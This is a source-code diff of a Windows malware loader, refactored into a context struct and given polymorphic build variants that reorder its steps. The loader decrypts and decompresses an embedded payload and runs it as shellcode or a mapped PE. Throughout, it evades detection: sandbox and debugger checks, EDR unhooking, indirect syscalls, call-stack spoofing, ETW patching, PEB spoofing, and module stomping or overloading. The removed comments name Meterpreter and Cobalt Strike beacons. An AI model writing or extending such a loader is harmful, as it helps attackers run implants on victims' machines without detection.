@@ -13,9 +13,13 @@
 #include "..\Engine\Xtea.h"
 #include "Unhooker.h"
 
-// Force C++ compiler to treat this as C linkable
+#ifndef POLY_VARIANT
+#define POLY_VARIANT 0
+#endif
+
 extern "C" {
     BOOL InitNtApi(void);
+    void PolyIslands_Touch(void);
 }
 
 typedef LPVOID   (WINAPI *pfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -26,338 +30,340 @@ typedef NTSTATUS (WINAPI *pfnNtProtect_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG
 
 #define RESOLVE_API(TYPE, HMOD, HASH) ((TYPE)GetProcAddressH(HMOD, HASH))
 
-/* ============================================================
- *  EntryPoint – modular entry point independent of CRT
- * ============================================================ */
-extern "C" int EntryPoint() {
+typedef struct _LOADER_CTX {
+    HMODULE         hKernel32;
+    pfnExitProcess  pExitProcess;
+    pfnVirtualAlloc pVirtualAlloc;
+    pfnVirtualFree  pVirtualFree;
 
-    /* MUST be first — populates all g_Hash_* before any lookup */
+    PBYTE  pEncryptedPayload;
+    DWORD  payloadSize;
+    DWORD  mutatedStubSize;
+    DWORD  origDecompSize;
+    DWORD  key_salt[4];
+    BYTE   dll_indices[3];
+    DWORD  exportHash;
+    DWORD  exportSeed;
+    LPCSTR pExportArg;
+    LPCSTR pSpoofExe;
+    LPCSTR pSemaphoreName;
+    DWORD  sleepFwdMs;
+    DWORD  uptimeMin;
+    DWORD  hammerMs;
+    DWORD  opsecFlags;
+
+    DWORD  dwProtectSsn;
+    PVOID  pProtectTrampoline;
+    BYTE*  pDecompressedPE;
+} LOADER_CTX;
+
+static void Loader_Die(LOADER_CTX* ctx, UINT code) {
+    if (ctx && ctx->pExitProcess) ctx->pExitProcess(LOADER_EXIT(code));
+}
+
+static BOOL Loader_InitApis(LOADER_CTX* ctx) {
     ApiHashing_InitHashes();
 
-    HMODULE hKernel32 = GetModuleHandleH(g_Hash_kernel32);
-    if (!hKernel32) return (int)LOADER_EXIT(1);
+    ctx->hKernel32 = GetModuleHandleH(g_Hash_kernel32);
+    if (!ctx->hKernel32) return FALSE;
 
-    pfnExitProcess  pExitProcess  = RESOLVE_API(pfnExitProcess,  hKernel32, g_Hash_ExitProcess);
-    pfnVirtualAlloc pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, hKernel32, g_Hash_VirtualAlloc);
-    pfnVirtualFree  pVirtualFree  = RESOLVE_API(pfnVirtualFree,  hKernel32, g_Hash_VirtualFree);
+#if POLY_VARIANT == 3
+    ctx->pVirtualFree  = RESOLVE_API(pfnVirtualFree,  ctx->hKernel32, g_Hash_VirtualFree);
+    ctx->pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, ctx->hKernel32, g_Hash_VirtualAlloc);
+    ctx->pExitProcess  = RESOLVE_API(pfnExitProcess,  ctx->hKernel32, g_Hash_ExitProcess);
+#else
+    ctx->pExitProcess  = RESOLVE_API(pfnExitProcess,  ctx->hKernel32, g_Hash_ExitProcess);
+    ctx->pVirtualAlloc = RESOLVE_API(pfnVirtualAlloc, ctx->hKernel32, g_Hash_VirtualAlloc);
+    ctx->pVirtualFree  = RESOLVE_API(pfnVirtualFree,  ctx->hKernel32, g_Hash_VirtualFree);
+#endif
 
-    if (!pExitProcess)  return (int)LOADER_EXIT(22);
-    if (!pVirtualAlloc) return (int)LOADER_EXIT(23);
-    if (!pVirtualFree)  return (int)LOADER_EXIT(24);
+    if (!ctx->pExitProcess || !ctx->pVirtualAlloc || !ctx->pVirtualFree) return FALSE;
+    return TRUE;
+}
 
-    /* Step 1: Read .rsrc metadata — opsecFlags must be known before evasion
-     * checks so that per-check EVASION_FLAG_NO_* bits can be honoured.
-     * Resource parsing is fast (no crypto — just locating the 280-byte
-     * metadata block in the already-mapped .rsrc section). */
-    PBYTE  pEncryptedPayload = NULL;
-    DWORD  payloadSize = 0, mutatedStubSize = 0, origDecompSize = 0;
-    DWORD  key_salt[4]    = { 0 };
-    BYTE   dll_indices[3] = { 0 };
-    DWORD  exportHash     = 0;
-    LPCSTR pExportArg     = NULL;   /* points into locked resource view — valid for process lifetime */
-    LPCSTR pSpoofExe      = NULL;   /* points into locked resource view — valid for process lifetime */
-    LPCSTR pSemaphoreName = NULL;   /* points into locked resource view — NULL = use default "wuauctl" */
-    DWORD  sleepFwdMs     = 0;      /* 0 = use default 500 ms in Evasion_CheckSleepForwarding */
-    DWORD  uptimeMin      = 0;      /* 0 = use default 2 min in Evasion_CheckUptime */
-    DWORD  hammerMs       = 0;      /* 0 = use default 3000 ms in Evasion_HammerDelay */
-    DWORD  opsecFlags     = 0;
-    DWORD  dwExtractionError = 0;
+static BOOL Loader_LoadPayload(LOADER_CTX* ctx, DWORD* pdwErr) {
+    return GetPayloadFromResource(&ctx->pEncryptedPayload, &ctx->payloadSize,
+                                  &ctx->mutatedStubSize, &ctx->origDecompSize,
+                                  ctx->key_salt, ctx->dll_indices, &ctx->exportHash,
+                                  &ctx->pExportArg, &ctx->pSpoofExe, &ctx->pSemaphoreName,
+                                  &ctx->sleepFwdMs, &ctx->uptimeMin, &ctx->hammerMs,
+                                  &ctx->opsecFlags, pdwErr);
+}
 
-    if (!GetPayloadFromResource(&pEncryptedPayload, &payloadSize, &mutatedStubSize, &origDecompSize,
-                                key_salt, dll_indices, &exportHash, &pExportArg, &pSpoofExe,
-                                &pSemaphoreName, &sleepFwdMs, &uptimeMin, &hammerMs,
-                                &opsecFlags, &dwExtractionError)) {
-        pExitProcess(LOADER_EXIT(dwExtractionError));
-    }
+static void Loader_Evasion(LOADER_CTX* ctx) {
+    Evasion_HammerDelay(ctx->hammerMs ? ctx->hammerMs : 3000, ctx->opsecFlags);
+    if (Evasion_RunChecks(ctx->opsecFlags, ctx->pSemaphoreName, ctx->sleepFwdMs, ctx->uptimeMin))
+        ctx->pExitProcess(0);
+}
 
-    /* Step 1.5: Evasion — timing delay + sandbox/debugger detection.
-     *
-     * Placed AFTER resource read so opsecFlags (including EVASION_FLAG_NO_*)
-     * are available.
-     *
-     * HammerDelay first: burns real wall-clock time before any visible OPSEC
-     * activity.  RunChecks then tests for debuggers and sandbox indicators.
-     * Exit code 0 ("normal termination") avoids the suspicious exit codes
-     * used for genuine errors elsewhere in the loader. */
-    Evasion_HammerDelay(hammerMs ? hammerMs : 3000, opsecFlags);
-    if (Evasion_RunChecks(opsecFlags, pSemaphoreName, sleepFwdMs, uptimeMin)) pExitProcess(0);
+static DWORD Loader_InitSyscalls(LOADER_CTX* ctx) {
+    (void)ctx;
+    if (!Syscalls_Init()) return 29;
+    if (!InitNtApi()) return 30;
+    return 0;
+}
 
-    /* Step 2: Syscalls + NT API init — always required */
-    if (!Syscalls_Init())  pExitProcess(LOADER_EXIT(29));
-    if (!InitNtApi())      pExitProcess(LOADER_EXIT(30));
-
-    /* Step 2.5: Optional EDR userland unhooker.
-    * Restores original .text bytes in ntdll/kernel32/kernelbase from
-    * \KnownDlls\ clean copies, overwriting EDR inline hooks.
-    * Runs after InitNtApi so Sys_Nt* wrappers (HellsHall) are available.
-    * Runs before StackSpoof so subsequent Win32 calls hit clean code. */
-    if (opsecFlags & OPSEC_FLAG_UNHOOK) {
+static void Loader_Unhook(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_UNHOOK)
         Unhook_RestoreAll();
-    }
+}
 
-    /* Step 3: Optional call-stack spoofing (SilentMoonwalk RSP pivot).
-     * StackSpoof_Init locates two ntdll gadgets (`add rsp, imm; ret` and
-     * `jmp rbx`) and builds a synthetic stack so that — every time
-     * HellsHallSyscall fires — RSP is pivoted onto a fake frame anchored at
-     * RtlUserThreadStart, hiding the loader's real return chain from EDR
-     * stack walkers.  Skip when OPSEC_FLAG_NO_CALLSTACK is set. */
-    if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) {
-        if (!StackSpoof_Init()) {
-            /* Debug: 41 = ntdll base, 42 = AddRsp gadget, 43 = JmpRbx gadget,
-             * 44 = RtlUserThreadStart export.  Release: always 0. */
-            pExitProcess(LOADER_EXIT(40 + g_SpoofInitFailStep));
-        }
+static BOOL Loader_InitSpoof(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK) return TRUE;
+    if (!StackSpoof_Init()) {
+        Loader_Die(ctx, 40 + g_SpoofInitFailStep);
+        return FALSE;
     }
+    return TRUE;
+}
 
-    /* Step 4: Optional ETW patch.
-     * Completes the evasion triad:
-     *   API hooks     → HellsHall (indirect syscall, no ntdll hook hit)
-     *   Call stack    → Moonwalk RSP pivot (synthetic stack rooted at RtlUserThreadStart)
-     *   ETW events    → Opsec_PatchEtw (EtwEventWrite → xor eax,eax / ret) */
-    if (!(opsecFlags & OPSEC_FLAG_NO_ETW)) {
-        if (!Opsec_PatchEtw()) {
-            /* Debug: 61 = no ntdll, 62 = no EtwEventWrite export,
-             * 63 = Syscalls_GetParamsByHash failed for NtProtectVirtualMemory,
-             * 64 = NtProtectVirtualMemory returned non-success.  Release: always 0. */
-            pExitProcess(LOADER_EXIT(60 + g_EtwFailStep));
-        }
+static BOOL Loader_PatchEtw(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_NO_ETW) return TRUE;
+    if (!Opsec_PatchEtw()) {
+        Loader_Die(ctx, 60 + g_EtwFailStep);
+        return FALSE;
     }
+    return TRUE;
+}
 
-    /* Step 5: XTEA outer decryption.
-     *
-     * pEncryptedPayload holds the raw blob from .rsrc:
-     *   XTEA_encrypted( [mutated ASM stub | CompoundEncrypted compressed payload] )
-     *
-     * After Xtea_Crypt() the buffer contains the cleartext ready for module stomping. */
+static void Loader_DecryptXtea(LOADER_CTX* ctx) {
     DWORD xteaKey[4];
-    Xtea_DeriveKey(xteaKey, key_salt);
-    Xtea_Crypt(pEncryptedPayload, payloadSize, xteaKey);
+    Xtea_DeriveKey(xteaKey, ctx->key_salt);
+    Xtea_Crypt(ctx->pEncryptedPayload, ctx->payloadSize, xteaKey);
 
-    /* Wipe key material from stack immediately — no residue.
-     * exportSeed is extracted first: RunPE needs it to hash export names. */
-    DWORD exportSeed = key_salt[0];
-    xteaKey[0]  = xteaKey[1]  = xteaKey[2]  = xteaKey[3]  = 0;
-    key_salt[0] = key_salt[1] = key_salt[2] = key_salt[3] = 0;
+    ctx->exportSeed = ctx->key_salt[0];
+    xteaKey[0] = xteaKey[1] = xteaKey[2] = xteaKey[3] = 0;
+    ctx->key_salt[0] = ctx->key_salt[1] = ctx->key_salt[2] = ctx->key_salt[3] = 0;
+}
 
-    /* Step 6: Optional PEB spoof.
-     * Placed after payload read to avoid breaking GetModuleFileNameW used
-     * internally by some Win32 APIs during resource loading. */
-    if (!(opsecFlags & OPSEC_FLAG_NO_PEB)) {
-        /* Build full spoof path: "C:\Windows\System32\" + pSpoofExe (ASCII filename).
-         * Prefix is XOR-encoded (key 0x66) — no plaintext wide-string IOC in .rdata.
-         * Decoded chars: C : \ W i n d o w s \ S y s t e m 3 2 \ */
-        static const BYTE kPrefixEnc[] = {
-            0x25,0x5C,0x3A,0x31,0x0F,0x08,0x02,0x09,
-            0x11,0x15,0x3A,0x35,0x1F,0x15,0x12,0x03,
-            0x0B,0x55,0x54,0x3A
-        };
-        WCHAR spoofPathW[80];
-        int   wpi = 0;
-        for (int ii = 0; ii < 20; ii++) spoofPathW[wpi++] = (WCHAR)(kPrefixEnc[ii] ^ 0x66u);
-        if (pSpoofExe) {
-            const char* pNameA = pSpoofExe;
-            while (*pNameA && wpi < 79) { spoofPathW[wpi++] = (WCHAR)(unsigned char)*pNameA++; }
-        }
-        spoofPathW[wpi] = L'\0';
-        Opsec_SpoofPeb(spoofPathW);
+static void Loader_SpoofPeb(LOADER_CTX* ctx) {
+    if (ctx->opsecFlags & OPSEC_FLAG_NO_PEB) return;
+
+    static const BYTE kPrefixEnc[] = {
+        0x25,0x5C,0x3A,0x31,0x0F,0x08,0x02,0x09,
+        0x11,0x15,0x3A,0x35,0x1F,0x15,0x12,0x03,
+        0x0B,0x55,0x54,0x3A
+    };
+    WCHAR spoofPathW[80];
+    int   wpi = 0;
+    for (int ii = 0; ii < 20; ii++) spoofPathW[wpi++] = (WCHAR)(kPrefixEnc[ii] ^ 0x66u);
+    if (ctx->pSpoofExe) {
+        const char* pNameA = ctx->pSpoofExe;
+        while (*pNameA && wpi < 79) { spoofPathW[wpi++] = (WCHAR)(unsigned char)*pNameA++; }
     }
+    spoofPathW[wpi] = L'\0';
+    Opsec_SpoofPeb(spoofPathW);
+}
 
-    /* Step 7: Allocate execution buffer in a legitimate DLL's .text section.
-     *
-     * Two strategies selected by OPSEC_FLAG_MODULE_OVERLOAD:
-     *
-     *  Stomping  (default) — LoadLibraryW, section RX → RW, write, restore after use.
-     *                        DLL appears in PEB LDR; .text region is disk-backed (MEM_IMAGE).
-     *
-     *  Overloading         — NtCreateSection(SEC_IMAGE) + NtMapViewOfSection on the raw
-     *                        file handle.  DLL is NOT in PEB LDR; region is disk-backed
-     *                        (MEM_IMAGE); VirtualQuery shows the backing file path.
-     *                        Defeats Moneta/pe-sieve/BeaconEye without a PEB LDR entry.
-     *                        After use: NtUnmapViewOfSection discards COW private pages.
-     */
+/* POLY_VARIANT reorders independent OPSEC steps. MUST constraints preserved:
+ *   Unhook/Spoof/ETW after InitNtApi; Spoof before spoofed Nt* preferred;
+ *   XTEA before stomp; PEB after resource (always). */
+static void Loader_OpsecPhase(LOADER_CTX* ctx) {
+#if POLY_VARIANT == 1
+    /* Spoof → Unhook → XTEA → PEB → ETW */
+    if (!Loader_InitSpoof(ctx)) return;
+    Loader_Unhook(ctx);
+    Loader_DecryptXtea(ctx);
+    Loader_SpoofPeb(ctx);
+    if (!Loader_PatchEtw(ctx)) return;
+#elif POLY_VARIANT == 2
+    /* Unhook → Spoof → PEB → XTEA → ETW */
+    Loader_Unhook(ctx);
+    if (!Loader_InitSpoof(ctx)) return;
+    Loader_SpoofPeb(ctx);
+    Loader_DecryptXtea(ctx);
+    if (!Loader_PatchEtw(ctx)) return;
+#elif POLY_VARIANT == 3
+    /* Spoof → ETW → Unhook → XTEA → PEB */
+    if (!Loader_InitSpoof(ctx)) return;
+    if (!Loader_PatchEtw(ctx)) return;
+    Loader_Unhook(ctx);
+    Loader_DecryptXtea(ctx);
+    Loader_SpoofPeb(ctx);
+#else
+    /* V0 baseline: Unhook → Spoof → ETW → XTEA → PEB */
+    Loader_Unhook(ctx);
+    if (!Loader_InitSpoof(ctx)) return;
+    if (!Loader_PatchEtw(ctx)) return;
+    Loader_DecryptXtea(ctx);
+    Loader_SpoofPeb(ctx);
+#endif
+}
+
+static BOOL Loader_DecryptExec(LOADER_CTX* ctx) {
     PVOID  pOriginalDllBytes    = NULL;
     SIZE_T originalDllBytesSize = 0;
-    PVOID  pOverloadViewBase    = NULL;   /* non-NULL only in MODULE_OVERLOAD mode */
+    PVOID  pOverloadViewBase    = NULL;
 
     PVOID execBuf;
-    if (opsecFlags & OPSEC_FLAG_MODULE_OVERLOAD) {
-        execBuf = ModuleOverload_Alloc(payloadSize, dll_indices,
+    if (ctx->opsecFlags & OPSEC_FLAG_MODULE_OVERLOAD) {
+        execBuf = ModuleOverload_Alloc(ctx->payloadSize, ctx->dll_indices,
                                        &pOriginalDllBytes, &originalDllBytesSize,
                                        &pOverloadViewBase);
     } else {
-        execBuf = ModuleStomp_Alloc(payloadSize, dll_indices,
+        execBuf = ModuleStomp_Alloc(ctx->payloadSize, ctx->dll_indices,
                                     &pOriginalDllBytes, &originalDllBytesSize);
     }
 
-    /* dll_indices no longer needed after ModuleStomp_Alloc — zero immediately */
-    custom_memset(dll_indices, 0, sizeof(dll_indices));
+    custom_memset(ctx->dll_indices, 0, sizeof(ctx->dll_indices));
 
     if (!execBuf) {
-        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(LOADER_EXIT(33));
+        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
+        Loader_Die(ctx, 33);
+        return FALSE;
     }
 
-    // Copy ONLY the decryptor stub into execBuf (stomped .text section).
-    // The payload stays in pEncryptedPayload — a separate RW allocation.
-    // Splitting code and data into separate allocations eliminates RWX:
-    //   execBuf           — RW during copy → RX for decryptor execution → restored
-    //   pEncryptedPayload — RW throughout; decryptor receives its address via RCX
-    custom_memcpy(execBuf, pEncryptedPayload, mutatedStubSize);
+    custom_memcpy(execBuf, ctx->pEncryptedPayload, ctx->mutatedStubSize);
 
-    DWORD  dwProtectSsn       = 0;
-    PVOID  pProtectTrampoline = NULL;
-    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory, &dwProtectSsn, &pProtectTrampoline)) {
-        custom_memset(execBuf, 0, payloadSize);
-        custom_memset(pEncryptedPayload, 0, payloadSize);
-        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(LOADER_EXIT(34));
+    if (!Syscalls_GetParamsByHash(g_Hash_ZwProtectVirtualMemory,
+                                  &ctx->dwProtectSsn, &ctx->pProtectTrampoline)) {
+        custom_memset(execBuf, 0, ctx->payloadSize);
+        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
+        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
+        Loader_Die(ctx, 34);
+        return FALSE;
     }
 
-    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
     pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;
 
     ULONG  dwOldProtect = 0;
-    SIZE_T regionSize   = (SIZE_T)mutatedStubSize;
+    SIZE_T regionSize   = (SIZE_T)ctx->mutatedStubSize;
 
-    // Flip RW → RX: no write bit — decryptor is code, payload is in separate buffer
-    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
     NTSTATUS status = pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_EXECUTE_READ, &dwOldProtect);
     if (!NT_SUCCESS(status)) {
-        custom_memset(execBuf, 0, payloadSize);
-        custom_memset(pEncryptedPayload, 0, payloadSize);
-        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(LOADER_EXIT(34));
+        custom_memset(execBuf, 0, ctx->payloadSize);
+        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
+        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
+        Loader_Die(ctx, 34);
+        return FALSE;
     }
 
-    // Call decryptor: pass payload pointer in RCX (Windows x64 first argument).
-    // Decryptor reads from pEncryptedPayload+mutatedStubSize and decrypts in-place (RW).
-    PBYTE pCompressedPayload = pEncryptedPayload + mutatedStubSize;
+    PBYTE pCompressedPayload = ctx->pEncryptedPayload + ctx->mutatedStubSize;
     typedef void (*DecryptFn_t)(PBYTE pPayload);
     ((DecryptFn_t)execBuf)(pCompressedPayload);
 
-    // Flip RX → RW immediately after decryptor returns — closes the RX window
-    // From this point execBuf is writable for wipe + DLL restore
-    regionSize = payloadSize;
-    SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    regionSize = ctx->payloadSize;
+    SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
     pNtProtect((HANDLE)-1, &execBuf, &regionSize, PAGE_READWRITE, &dwOldProtect);
 
-    /* Step 8: Decompression using LZNT1.
-     * pCompressedPayload points into pEncryptedPayload (the separate RW buffer).
-     * After decompression we zero and free pEncryptedPayload — it's no longer needed */
-    DWORD compressedSize = payloadSize - mutatedStubSize;
-
-    BYTE* pDecompressedPE = NULL;
-    if (!DecompressPayload(pCompressedPayload, compressedSize, &pDecompressedPE, origDecompSize)) {
-        custom_memset(execBuf, 0, payloadSize);
-        custom_memset(pEncryptedPayload, 0, payloadSize);
-        pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-        pExitProcess(LOADER_EXIT(34));
+    DWORD compressedSize = ctx->payloadSize - ctx->mutatedStubSize;
+    ctx->pDecompressedPE = NULL;
+    if (!DecompressPayload(pCompressedPayload, compressedSize,
+                           &ctx->pDecompressedPE, ctx->origDecompSize)) {
+        custom_memset(execBuf, 0, ctx->payloadSize);
+        custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
+        ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
+        Loader_Die(ctx, 34);
+        return FALSE;
     }
 
-    custom_memset(pEncryptedPayload, 0, payloadSize);
-    pVirtualFree(pEncryptedPayload, 0, MEM_RELEASE);
-    pEncryptedPayload = NULL;
+    custom_memset(ctx->pEncryptedPayload, 0, ctx->payloadSize);
+    ctx->pVirtualFree(ctx->pEncryptedPayload, 0, MEM_RELEASE);
+    ctx->pEncryptedPayload = NULL;
 
-    /* Wipe the decryptor from the stomped region (execBuf is now RW). */
-    custom_memset(execBuf, 0, payloadSize);
+    custom_memset(execBuf, 0, ctx->payloadSize);
 
     if (pOriginalDllBytes && originalDllBytesSize) {
         custom_memcpy(execBuf, pOriginalDllBytes, originalDllBytesSize);
 
-        /* Restore .text: RW → RX (drop write bit, re-add execute) */
         SIZE_T restoreSize  = originalDllBytesSize;
         PVOID  pRestoreBase = execBuf;
-        SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+        SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
         pNtProtect((HANDLE)-1, &pRestoreBase, &restoreSize, PAGE_EXECUTE_READ, &dwOldProtect);
 
-        pVirtualFree(pOriginalDllBytes, 0, MEM_RELEASE);
-        pOriginalDllBytes = NULL;
+        ctx->pVirtualFree(pOriginalDllBytes, 0, MEM_RELEASE);
     }
 
-    /* Module Overloading: unmap the disk-backed view to discard COW private pages.
-     * For Module Stomping, execBuf lives inside a LoadLibraryW-mapped DLL — no unmap. */
-    if (pOverloadViewBase) {
+    if (pOverloadViewBase)
         pNtUnmapViewOfSection((HANDLE)-1, pOverloadViewBase);
-        pOverloadViewBase = NULL;
-    }
 
-    /* Step 9: Run payload — two paths depending on flags.
-     *
-     * PE path (default):
-     *   Pass StackSpoof_Cleanup as pre-execute callback.  RunPE calls it after
-     *   all syscalls complete but before handing over to the payload, so the
-     *   pivot is disabled before the payload starts running its own threads
-     *   (which must see real return addresses).
-     *
-     * Shellcode path (PAYLOAD_FLAG_IS_SHELLCODE):
-     *   No PE mapping needed.  Flip the decompressed buffer RW→RX via indirect
-     *   syscall, call StackSpoof_Cleanup manually (same OPSEC invariant as PE
-     *   path), then jump directly into the shellcode.  The RX flip reuses the
-     *   same NtProtect SSN + trampoline already resolved above. */
-    if (opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE) {
-        /* Flip decompressed buffer: RW → RX */
-        SIZE_T scSize  = (SIZE_T)origDecompSize;
-        PVOID  pScBase = pDecompressedPE;
-        SetSyscallParams(dwProtectSsn, pProtectTrampoline);
+    return TRUE;
+}
+
+static void Loader_RunPayload(LOADER_CTX* ctx) {
+    pfnNtProtect_t pNtProtect = (pfnNtProtect_t)HellsHallSyscall;
+    ULONG dwOldProtect = 0;
+    NTSTATUS status;
+
+    if (ctx->opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE) {
+        SIZE_T scSize  = (SIZE_T)ctx->origDecompSize;
+        PVOID  pScBase = ctx->pDecompressedPE;
+        SetSyscallParams(ctx->dwProtectSsn, ctx->pProtectTrampoline);
         status = pNtProtect((HANDLE)-1, &pScBase, &scSize, PAGE_EXECUTE_READ, &dwOldProtect);
         if (!NT_SUCCESS(status)) {
-            custom_memset(pDecompressedPE, 0, origDecompSize);
-            pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
-            pExitProcess(LOADER_EXIT(36));
+            custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
+            ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
+            Loader_Die(ctx, 36);
+            return;
         }
 
-        /* Disable RSP pivot before handing over — same invariant as RunPE's PreExecuteCb */
-        if (!(opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) StackSpoof_Cleanup();
+        if (!(ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK)) StackSpoof_Cleanup();
 
-        void (*pShellcode)(void) = (void (*)(void))pDecompressedPE;
+        void (*pShellcode)(void) = (void (*)(void))ctx->pDecompressedPE;
         pShellcode();
 
-        /* KEEP_ALIVE on shellcode path: many MSF stagers (BlockApi-style)
-         * return to the caller immediately after CreateThread'ing the C2
-         * worker.  If we wipe pDecompressedPE and ExitThread right after
-         * the call, two things break:
-         *   (a) the freshly-spawned worker may still be in startup and
-         *       dereferencing code/data inside our buffer (BlockApi keeps
-         *       trampolines/import tables there) — wiping it crashes the
-         *       worker before it ever touches the network;
-         *   (b) if the stager runs *inline* (no separate thread) and is
-         *       still mid-handshake on its return path, ExitThread(0) on
-         *       the only thread terminates the whole process before any
-         *       packet leaves.
-         * Holding the loader thread parked here lets the worker establish
-         * the C2 session unobstructed; the buffer stays mapped for the
-         * lifetime of the process, which is what stageless beacons assume. */
-        if (opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
+        /* RAW keep-alive: park loader thread — do not wipe buffer (stager workers). */
+        if (ctx->opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
             typedef VOID (WINAPI *pfnSleep_t)(DWORD);
-            pfnSleep_t pSleep = (pfnSleep_t)GetProcAddressH(hKernel32, g_Hash_Sleep);
+            pfnSleep_t pSleep = (pfnSleep_t)GetProcAddressH(ctx->hKernel32, g_Hash_Sleep);
             if (pSleep) {
-                for (;;) pSleep(0xFFFFFFFF);  /* INFINITE — never returns */
+                for (;;) pSleep(0xFFFFFFFF);
             }
         }
 
-        /* Reached only if shellcode returns AND KEEP_ALIVE is not set */
-        custom_memset(pDecompressedPE, 0, origDecompSize);
-        pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
+        custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
+        ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
     } else {
-        void (*pPreExec)(void) = (opsecFlags & OPSEC_FLAG_NO_CALLSTACK) ? NULL : StackSpoof_Cleanup;
-        DWORD runPeRes = RunPE(pDecompressedPE, exportHash, exportSeed, pExportArg, pPreExec);
+        void (*pPreExec)(void) = (ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK)
+                                     ? NULL : StackSpoof_Cleanup;
+        DWORD runPeRes = RunPE(ctx->pDecompressedPE, ctx->exportHash, ctx->exportSeed,
+                               ctx->pExportArg, pPreExec);
 
-        custom_memset(pDecompressedPE, 0, origDecompSize);
-        pVirtualFree(pDecompressedPE, 0, MEM_RELEASE);
+        custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
+        ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
 
-        if (runPeRes != 0) pExitProcess(LOADER_EXIT(runPeRes));
+        if (runPeRes != 0) {
+            Loader_Die(ctx, runPeRes);
+            return;
+        }
     }
 
-    /* OPSEC_FLAG_KEEP_ALIVE: exit only the loader thread, leave beacon threads running.
-     * ExitProcess would kill every thread — including the C2 implant's threads.
-     * ExitThread(0) terminates this thread only; the process stays alive as long as
-     * any other thread is running.  Required for DLL payloads (Meterpreter, CS beacon)
-     * that spawn their own threads from DllMain or the invoked export. */
-    if (opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
-        pfnExitThread_t pExitThread = (pfnExitThread_t)GetProcAddressH(hKernel32, g_Hash_ExitThread);
+    if (ctx->opsecFlags & OPSEC_FLAG_KEEP_ALIVE) {
+        pfnExitThread_t pExitThread =
+            (pfnExitThread_t)GetProcAddressH(ctx->hKernel32, g_Hash_ExitThread);
         if (pExitThread) pExitThread(0);
-        /* Fallthrough to ExitProcess if ExitThread resolution failed */
     }
-    pExitProcess(LOADER_EXIT(777));
+    Loader_Die(ctx, 777);
+}
+
+extern "C" int EntryPoint() {
+    LOADER_CTX ctx;
+    custom_memset(&ctx, 0, sizeof(ctx));
+
+    /* Keep mutation islands in the binary (no runtime effect). */
+    PolyIslands_Touch();
+
+    if (!Loader_InitApis(&ctx))
+        return (int)LOADER_EXIT(ctx.pExitProcess ? 22 : 1);
+
+    DWORD dwExtractionError = 0;
+    if (!Loader_LoadPayload(&ctx, &dwExtractionError))
+        Loader_Die(&ctx, dwExtractionError);
+
+    Loader_Evasion(&ctx);
+
+    {
+        DWORD scErr = Loader_InitSyscalls(&ctx);
+        if (scErr) Loader_Die(&ctx, scErr);
+    }
+
+    Loader_OpsecPhase(&ctx);
+
+    if (!Loader_DecryptExec(&ctx))
+        return (int)LOADER_EXIT(34);
+
+    Loader_RunPayload(&ctx);
     return (int)LOADER_EXIT(777);
 }
